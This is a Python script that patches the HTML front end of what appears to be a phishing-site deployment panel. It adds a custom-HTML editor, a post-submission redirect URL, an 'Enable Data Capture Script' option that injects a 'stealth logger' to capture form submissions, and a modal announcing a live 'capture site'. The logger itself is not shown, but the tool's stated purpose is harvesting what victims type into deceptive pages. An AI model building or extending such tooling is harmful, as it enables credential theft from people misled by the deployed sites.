import re

with open('deploy.html', 'r') as f:
    content = f.read()

# Add Tailwind and Google Fonts, CodeMirror
head_additions = """
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">

    <!-- CodeMirror for Custom HTML -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/theme/material-ocean.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/htmlmixed/htmlmixed.min.js"></script>

    <style>
        :root {
            --bg-main: #050505;
            --bg-card: #111111;
            --text-main: #ffffff;
            --text-sec: #888;
            --accent: #0070f3;
            --accent-hover: #005bb5;
            --border: #222;
            --success: #17c964;
            --danger: #f31260;
            --warning: #f5a524;
            --radius: 12px;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-main);
            color: var(--text-main);
        }

        .glass-card {
            background: rgba(17, 17, 17, 0.6);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        /* Basic Plan Theme */
        body.plan-basic { --bg-main: #0d1117; --bg-card: #161b22; --accent: #2f81f7; --accent-hover: #58a6ff; --border: #30363d; }
        /* Premium Plan Theme */
        body.plan-premium { --bg-main: #000000; --bg-card: #0a0a0a; --text-main: #f0f0f0; --accent: #9b59b6; --accent-hover: #8e44ad; --border: #333; }
        /* Gold Plan Theme */
        body.plan-gold { --bg-main: #000000; --bg-card: #0a0a0a; --text-main: #fffdf0; --accent: #ffd700; --accent-hover: #ffea00; --border: #444; }

        .CodeMirror {
            height: 300px;
            border-radius: 8px;
            border: 1px solid var(--border);
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
            font-size: 13px;
        }

        .template-card {
            transition: all 0.2s ease;
        }
        .template-card:hover {
            transform: translateY(-4px);
            box-shadow: 0 10px 20px -5px rgba(0, 0, 0, 0.5);
            border-color: var(--accent);
        }
        .template-card.selected {
            border-color: var(--accent);
            box-shadow: 0 0 0 2px var(--accent);
        }

        /* Toast Notification */
        #toast {
            visibility: hidden;
            min-width: 250px;
            background-color: var(--bg-card);
            color: var(--text-main);
            text-align: center;
            border-radius: 8px;
            padding: 16px;
            position: fixed;
            z-index: 9999;
            bottom: 30px;
            right: 30px;
            opacity: 0;
            transition: opacity 0.3s, bottom 0.3s, visibility 0.3s;
            border-left: 4px solid var(--accent);
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
        }
        #toast.show { visibility: visible; opacity: 1; bottom: 50px; }
        #toast.success { border-color: var(--success); }
        #toast.error { border-color: var(--danger); }

        /* Success Modal Overlay */
        .modal-overlay {
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.8); backdrop-filter: blur(5px);
            z-index: 10000; display: none; justify-content: center; align-items: center;
            opacity: 0; transition: opacity 0.3s ease;
        }
        .modal-overlay.show { opacity: 1; display: flex; }
    </style>
"""

content = re.sub(r'<style>[\s\S]*?</style>', head_additions, content)

# Update layout
content = content.replace('<div class="container" id="main-content">', '<div class="max-w-4xl mx-auto p-4 md:p-8" id="main-content">')
content = content.replace('<header>', '<header class="flex items-center mb-8 pb-4 border-b border-[var(--border)]">')

# Custom HTML Section Update
custom_html_section = """
            <div id="section-custom" class="form-group hidden">
                <label class="block mb-2 text-sm font-semibold text-gray-300">Custom HTML Content</label>
                <div class="mb-3 flex items-center justify-between">
                    <input type="file" onchange="loadFile(this)" accept=".html,.txt" class="block w-full text-sm text-gray-400 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-[var(--bg-main)] file:text-[var(--accent)] hover:file:bg-black/50">
                </div>
                <!-- Textarea replaced by CodeMirror via JS -->
                <textarea id="customHtml"></textarea>

                <div class="mt-6">
                    <label class="block mb-2 text-sm font-semibold text-gray-300">Redirect URL (Optional)</label>
                    <input type="text" id="customRedirectUrl" placeholder="https://example.com/success" class="w-full px-4 py-3 bg-[var(--bg-main)] border border-[var(--border)] rounded-xl text-white outline-none focus:border-[var(--accent)] transition-colors">
                    <small class="text-gray-500 block mt-1 text-xs">Where users go after submission. Default logic used if blank.</small>
                </div>

                <div class="mt-6 p-4 bg-black/30 border border-[var(--border)] rounded-xl flex items-start gap-3">
                    <input type="checkbox" id="enableInjector" class="mt-1 w-4 h-4 text-[var(--accent)] bg-gray-900 border-gray-700 rounded focus:ring-[var(--accent)] accent-[var(--accent)]">
                    <div>
                        <span class="font-semibold block text-sm">Enable Data Capture Script</span>
                        <small class="text-gray-400 block mt-1 leading-relaxed">Injects the stealth logger required to capture form submissions. Without this, your custom HTML is static.</small>
                    </div>
                </div>
            </div>
"""
content = re.sub(r'<div id="section-custom".*?</div>\n            </div>', custom_html_section, content, flags=re.DOTALL)

# Add Toast and Success Modal
modals_html = """
    <div id="toast">Message</div>

    <!-- Success Modal -->
    <div id="success-modal" class="modal-overlay">
        <div class="glass-card p-8 rounded-2xl max-w-md w-full mx-4 text-center transform scale-95 transition-transform duration-300" id="success-modal-content">
            <div class="w-16 h-16 bg-green-500/20 text-green-500 rounded-full flex items-center justify-center mx-auto mb-4 border border-green-500/30">
                <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
            </div>
            <h2 class="text-2xl font-bold mb-2">Site Deployed!</h2>
            <p class="text-gray-400 mb-6 text-sm">Your capture site is live and ready to receive traffic.</p>

            <div class="bg-black/50 p-3 rounded-lg border border-[var(--border)] flex items-center justify-between mb-6">
                <span id="deployed-url" class="text-[var(--accent)] font-mono text-sm truncate mr-2">https://...</span>
                <button onclick="copyDeployedUrl()" class="p-2 hover:bg-white/10 rounded-md transition-colors text-gray-400 hover:text-white" title="Copy URL">
                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
                </button>
            </div>

            <div class="flex gap-3">
                <a href="dashboard.html" class="flex-1 py-3 bg-[var(--bg-card)] border border-[var(--border)] rounded-xl font-semibold hover:bg-white/5 transition-colors">Dashboard</a>
                <button onclick="closeSuccessModal()" class="flex-1 py-3 bg-[var(--accent)] text-white rounded-xl font-semibold hover:bg-[var(--accent-hover)] transition-colors">Deploy Another</button>
            </div>
        </div>
    </div>
"""
content = content.replace('</body>', modals_html + '\n</body>')

# Update JS for CodeMirror and Success Modal
js_additions = """
        let editor;

        // Init CodeMirror
        document.addEventListener('DOMContentLoaded', () => {
            editor = CodeMirror.fromTextArea(document.getElementById('customHtml'), {
                mode: "htmlmixed",
                theme: "material-ocean",
                lineNumbers: true,
                autoCloseTags: true,
                matchBrackets: true
            });

            // Refresh editor when switching to custom mode
            document.getElementById('btn-mode-custom').addEventListener('click', () => {
                setTimeout(() => editor.refresh(), 50);
            });
        });

        function loadFile(input) {
            const file = input.files[0];
            if (!file) return;
            const reader = new FileReader();
            reader.onload = function(e) {
                editor.setValue(e.target.result);
            };
            reader.readAsText(file);
        }

        function showToast(msg, type = 'success') {
            const toast = document.getElementById('toast');
            toast.innerText = msg;
            toast.className = '';
            toast.classList.add('show', type);
            setTimeout(() => { toast.classList.remove('show'); }, 3000);
        }

        function showMessage(text, type) {
            if(text) showToast(text, type);
        }

        function showSuccessModal(url) {
            const modal = document.getElementById('success-modal');
            const content = document.getElementById('success-modal-content');
            document.getElementById('deployed-url').innerText = url;

            modal.classList.add('show');
            setTimeout(() => {
                content.classList.remove('scale-95');
                content.classList.add('scale-100');
            }, 10);
        }

        function closeSuccessModal() {
            const modal = document.getElementById('success-modal');
            modal.classList.remove('show');
            // Reset form
            document.getElementById('subdomain').value = '';
            document.getElementById('url-preview').innerText = '';
        }

        function copyDeployedUrl() {
            const url = document.getElementById('deployed-url').innerText;
            navigator.clipboard.writeText(url).then(() => showToast('URL copied to clipboard!'));
        }
"""

# Replace old loadFile and showMessage
content = re.sub(r'function loadFile.*?\}', '', content, flags=re.DOTALL)
content = re.sub(r'function showMessage.*?\}', '', content, flags=re.DOTALL)
content = content.replace('// --- ADS ---', js_additions + '\n        // --- ADS ---')

# Update deploy function to use CodeMirror value and Success Modal
deploy_update = """
            if (currentMode === 'template') {
                payload.templateName = document.getElementById('selectedTemplateName').value;
                if (!payload.templateName) { showToast('Please select a template.', 'error'); return; }
            } else {
                payload.customHtml = editor.getValue();
                payload.enableInjector = document.getElementById('enableInjector').checked;
                payload.redirectUrl = document.getElementById('customRedirectUrl').value.trim();
                if (!payload.customHtml) { showToast('Please provide HTML content.', 'error'); return; }
            }

            btn.innerText = 'Deploying...';
            btn.disabled = true;

            try {
                const res = await fetch(`${WORKER_URL}/api/public/deploy`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                });
                const data = await res.json();

                if (data.success) {
                    localStorage.removeItem('deploy_ad_pass');
                    btn.innerText = 'Deploy Site';
                    btn.disabled = false;
                    showSuccessModal(data.url);
                } else {
                    showToast(data.error, 'error');
                    btn.disabled = false;
                    btn.innerText = 'Deploy Site';
                }
            } catch (e) {
                showToast('Network Error: ' + e.message, 'error');
                btn.disabled = false;
                btn.innerText = 'Deploy Site';
            }
"""
content = re.sub(r'if \(currentMode === \'template\'\) \{.*?catch \(e\) \{.*?\}', deploy_update, content, flags=re.DOTALL)

with open('deploy.html', 'w') as f:
    f.write(content)
